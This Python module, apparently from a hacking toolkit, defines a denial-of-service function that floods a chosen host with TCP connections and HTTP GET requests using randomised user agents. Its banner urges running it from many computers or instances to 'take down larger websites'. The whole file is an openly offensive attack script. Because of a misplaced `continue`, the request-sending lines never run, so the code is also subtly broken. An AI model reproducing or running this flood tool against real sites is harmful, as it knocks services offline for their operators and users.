import socket
from random import choice
from .user_agents import user_agents
from .clear_scr import clear_scr


def dos(host):
    clear_scr()

    print(
        "[*]This program will use HTTP FLOOD to dos the host.\n[*]"
        "It will work only on small websites if done only for one computer.\n[*]"
        "To take down larger websites run the attack from multiple computers.\n[*] "
        "For better performance open multiple instances of this software and attack at the same time.\n")
    print("[*]Host to attack: " + host)
    ip = socket.gethostbyname(host)
    print("[*]IP of the host: " + ip + "\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average "
        "sites): ")
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as err:
            raise err

        else:
            s.connect((ip, 80))
            continue
        print("[*]FLOODING!")
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode() + host.encode() + "\r\n".encode())
        s.send("User-Agent: ".encode() +
               choice(user_agents).encode() + "\r\n\r\n".encode())
        s.close()
